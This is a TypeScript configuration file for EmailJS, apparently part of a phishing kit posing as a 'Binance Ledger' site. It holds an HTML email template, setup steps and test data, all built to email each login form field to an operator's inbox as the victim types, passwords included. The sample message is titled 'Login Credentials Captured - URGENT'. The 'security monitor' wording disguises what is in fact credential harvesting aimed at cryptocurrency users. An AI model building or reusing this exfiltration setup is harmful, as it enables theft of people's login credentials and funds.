
/**
 * EmailJS Template Configuration Guide
 * 
 * Copy this template into your EmailJS dashboard to receive properly formatted emails
 */

export const EMAIL_TEMPLATE_CONFIG = {
  // Template variables that our application sends
  templateVariables: {
    to_email: "{{to_email}}", // Recipient email (your admin email)
    from_name: "{{from_name}}", // Sender name (Binance Ledger System)
    subject: "{{subject}}", // Email subject
    message: "{{message}}", // Formatted message with all form data
    step: "{{step}}", // Current form step
    field: "{{field}}", // Field name (optional)
    value: "{{value}}", // Field value (optional)
    username: "{{username}}", // User's username (optional)
    timestamp: "{{timestamp}}", // When the action occurred
    allFormData: "{{allFormData}}" // Complete form data as JSON (optional)
  },

  // HTML template to copy into EmailJS dashboard
  htmlTemplate: `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{subject}}</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 700px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .email-container {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #F0B90B, #FCD535);
            color: #000;
            padding: 25px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 28px;
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .content {
            padding: 30px;
        }
        .alert-box {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            border-left: 4px solid #F0B90B;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }
        .alert-box.critical {
            background-color: #f8d7da;
            border-color: #f1c2c8;
            border-left-color: #dc3545;
        }
        .data-section {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
        }
        .data-row {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 12px 0;
            border-bottom: 1px solid #e9ecef;
        }
        .data-row:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #495057;
            flex: 0 0 140px;
            margin-right: 15px;
        }
        .value {
            flex: 1;
            color: #212529;
            word-break: break-word;
            background-color: #fff;
            padding: 8px 12px;
            border-radius: 4px;
            border: 1px solid #e9ecef;
            font-family: 'Courier New', monospace;
        }
        .password-value {
            background-color: #ffe6e6;
            border-color: #ff9999;
            font-weight: bold;
        }
        .timestamp {
            color: #6c757d;
            font-size: 14px;
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 2px solid #dee2e6;
        }
        .footer {
            background-color: #f8f9fa;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #6c757d;
            border-top: 1px solid #dee2e6;
        }
        .step-badge {
            display: inline-block;
            background-color: #F0B90B;
            color: #000;
            padding: 8px 16px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .json-data {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            max-height: 400px;
            overflow-y: auto;
        }
        .security-warning {
            background-color: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
        }
        .form-data-table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }
        .form-data-table th,
        .form-data-table td {
            border: 1px solid #dee2e6;
            padding: 12px;
            text-align: left;
        }
        .form-data-table th {
            background-color: #e9ecef;
            font-weight: bold;
            color: #495057;
        }
        .form-data-table td {
            background-color: #fff;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header">
            <h1>🔒 {{subject}}</h1>
        </div>
        
        <div class="content">
            <div class="step-badge">{{step}}</div>
            
            <div class="alert-box critical">
                <strong>⚠️ SECURITY ALERT:</strong> New form activity detected. Review all details below immediately.
            </div>
            
            <div class="data-section">
                <h3 style="margin-top: 0; color: #495057; font-size: 20px;">📋 Activity Summary</h3>
                
                <div class="data-row">
                    <div class="label">Step:</div>
                    <div class="value">{{step}}</div>
                </div>
                
                <div class="data-row">
                    <div class="label">Timestamp:</div>
                    <div class="value">{{timestamp}}</div>
                </div>
                
                {{#username}}
                <div class="data-row">
                    <div class="label">Username:</div>
                    <div class="value">{{username}}</div>
                </div>
                {{/username}}
                
                {{#field}}
                <div class="data-row">
                    <div class="label">Field Updated:</div>
                    <div class="value">{{field}}</div>
                </div>
                {{/field}}
                
                {{#value}}
                <div class="data-row">
                    <div class="label">New Value:</div>
                    <div class="value {{#field}}{{#if (eq field 'password')}}password-value{{/if}}{{/field}}">{{value}}</div>
                </div>
                {{/value}}
            </div>
            
            {{#allFormData}}
            <div class="data-section">
                <h3 style="margin-top: 0; color: #495057; font-size: 20px;">📊 Complete Form Data</h3>
                <div class="security-warning">
                    <strong>⚠️ SENSITIVE DATA BELOW - HANDLE SECURELY</strong>
                </div>
                <div class="json-data">{{allFormData}}</div>
            </div>
            {{/allFormData}}
            
            <div class="data-section">
                <h3 style="margin-top: 0; color: #495057; font-size: 20px;">📧 Full Message</h3>
                <div style="background-color: #fff; border: 1px solid #dee2e6; border-radius: 6px; padding: 20px; white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.5;">{{message}}</div>
            </div>
            
            <div class="security-warning">
                <strong>🔐 SECURITY REMINDER:</strong><br>
                This email contains sensitive user data including potential passwords and personal information. Handle with extreme care and ensure secure storage/deletion practices.
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Binance Ledger Security Monitor</strong></p>
            <p>Automated notification system | Generated: {{timestamp}}</p>
            <p style="font-size: 11px; margin-top: 10px;">
                This email contains sensitive user data. Delete after processing and ensure compliance with data protection regulations.
            </p>
        </div>
    </div>
</body>
</html>
  `,

  // Setup instructions for EmailJS dashboard
  setupInstructions: [
    "🚀 SETUP INSTRUCTIONS FOR EMAILJS:",
    "",
    "1. Go to https://www.emailjs.com/ and log into your account",
    "2. Navigate to 'Email Templates' section",
    "3. Click 'Create New Template'",
    "4. Copy the ENTIRE HTML template above into the template editor",
    "5. Configure these settings:",
    "   • Template Name: 'Binance Ledger Form Monitor'",
    "   • To Email: YOUR_ADMIN_EMAIL@domain.com",
    "   • From Name: {{from_name}}",
    "   • Subject: {{subject}}",
    "   • Reply To: noreply@yourcompany.com",
    "6. Save the template and copy the Template ID",
    "7. Update TEMPLATE_ID in src/config/emailjs.config.ts",
    "8. Test by filling out any form field",
    "",
    "📧 TEMPLATE VARIABLES USED:",
    "• {{to_email}} - Your admin email",
    "• {{from_name}} - Sender identification", 
    "• {{subject}} - Dynamic email subject",
    "• {{message}} - Formatted message content",
    "• {{step}} - Current form step",
    "• {{field}} - Field being updated",
    "• {{value}} - Field value (including passwords)",
    "• {{username}} - User identification",
    "• {{timestamp}} - Activity timestamp",
    "• {{allFormData}} - Complete form data as JSON"
  ],

  // Test data to verify template
  testData: {
    to_email: "admin@yourcompany.com",
    from_name: "Binance Ledger System",
    subject: "🔒 Login Credentials Captured - URGENT",
    message: `Step: Login Form - Field Update
Field: password
Value: user123password
Username: john.doe@example.com
Timestamp: 2025-06-04T13:06:36.235Z

All Form Data:
{
  "username": "john.doe@example.com",
  "password": "user123password"
}`,
    step: "Login Form - Password Entry",
    field: "password",
    value: "user123password",
    username: "john.doe@example.com",
    timestamp: "2025-06-04T13:06:36.235Z",
    allFormData: JSON.stringify({
      username: "john.doe@example.com",
      password: "user123password"
    }, null, 2)
  }
};

export default EMAIL_TEMPLATE_CONFIG;
